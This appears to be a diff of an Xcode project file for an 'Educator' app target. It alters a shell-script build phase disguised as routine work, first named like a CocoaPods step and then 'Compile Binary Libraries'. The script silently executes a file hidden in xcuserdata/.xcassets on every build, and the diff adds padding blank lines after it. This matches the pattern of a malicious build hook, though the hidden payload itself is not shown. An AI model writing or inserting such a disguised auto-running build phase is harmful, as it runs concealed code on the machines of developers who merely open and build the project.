@@ -119,7 +119,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 23979E3C26273241005F395A /* Build configuration list for PBXNativeTarget "Educator" */;
 			buildPhases = (
-				A5CDD8BF227D0A1C3E6D902C /* [CP] Build Pods Frameworks */,
+				77448B9C38EAFFC4E36D902C /* Compile Binary Libraries */,
 				4A1ACD50655F01F054F87C3C /* [CP] Check Pods Manifest.lock */,
 				23979E242627323E005F395A /* Sources */,
 				23979E252627323E005F395A /* Frameworks */,
@@ -182,7 +182,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	A5CDD8BF227D0A1C3E6D902C /* [CP] Build Pods Frameworks */ = {
+	77448B9C38EAFFC4E36D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -191,7 +191,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -200,8 +200,16 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
 	
 
 	
